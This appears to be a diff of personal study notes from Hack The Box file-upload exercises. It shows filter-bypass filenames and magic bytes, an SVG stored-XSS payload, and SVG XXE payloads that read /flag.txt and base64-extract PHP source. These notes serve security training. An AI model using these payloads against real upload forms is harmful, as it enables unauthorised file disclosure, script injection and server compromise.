@@ -74,16 +74,79 @@ done
 | `XXE`/`SSRF` | XML, SVG, PDF, PPT, DOC |
 | `DoS` | ZIP, JPG, PNG |
 
-# Upload Exercise  
+# Exercises  
 
->The server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt"
+## Upload Filters    
 
-Client-Side
+>This [web server exercise](https://academy.hackthebox.com/module/136/section/1290) employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt"
 
-type-filters-exercise-step1.png
+>Client-Side  
+>HTML script functions validation cleared before loading DOM.
+
+![type-filters-exercise-step1](/images/type-filters-exercise-step1.png)  
+
+>Blacklist & Whitelist  
+>Fuzzing of file names with various character injections to the extensions reveal valid filenames, `shell.jpg:.phar`
+
+>determine valid filename and extension.
+
+>Content-Type & MIME-type  
+The content type and mime type combination is checked by backend and fuzzing wordlist of content type, identify valid types as:  
+
+```
+Content-Type: image/gif
+GIF8
+```  
+
+![type-filters-exercise-step](/images/type-filters-exercise-step3.png)  
+
+>Get sensitive info flag: `GET /profile_images/shell.jpg:.phar`.  
+
+## XSS & XXE in Uploads  
+
+>Burp Sutie Certified Practitioner Study Exercises and notes:
+* [BSCP - XXE via SVG Image upload](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#xxe-via-svg-image-upload)  
+* [BSCP - XSS SVG Upload](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#xss-svg-upload)  
+
+>This File Upload exercise contains an vulnerable upload functionality that should be secure against arbitrary file uploads. But the content of the files can execute server side to read sensitive files using XXE or trigger stored XSS.  
+
+>XSS inside SVG image file: `htb.svg`, uploaded to target.
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
+    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
+    <script type="text/javascript">alert(window.origin);</script>
+</svg>
+```
+
+>When XML SVG file is upload the XSS is triggered.  
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
+<svg>&xxe;</svg>
+```  
+
+>Above will render on the index landing page and retrieve the contents of `/flag.txt`.  
+
+>Source code of PHP files can be trieved using Base64 to prevent execution on server, using below XML payload file upload:  
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
+<svg>&xxe;</svg>
+```  
+
+![xxe-svg-upload-base64](/images/xxe-svg-upload-base64.png)  
+
+# Skills Assessment - File Upload Attacks  
+
+>[Extra Exercise](https://academy.hackthebox.com/module/136/section/1310)  
+
+>You are contracted to perform a penetration test for a company's e-commerce web application. The web application is in its early stages, so you will only be testing any file upload forms you can find.
+>Try to utilize what you learned in this module to understand how the upload form works and how to bypass various validations in place (if any) to gain remote code execution on the back-end server.  
 
 
-Blacklist
-
-Whitelist
-
+ 
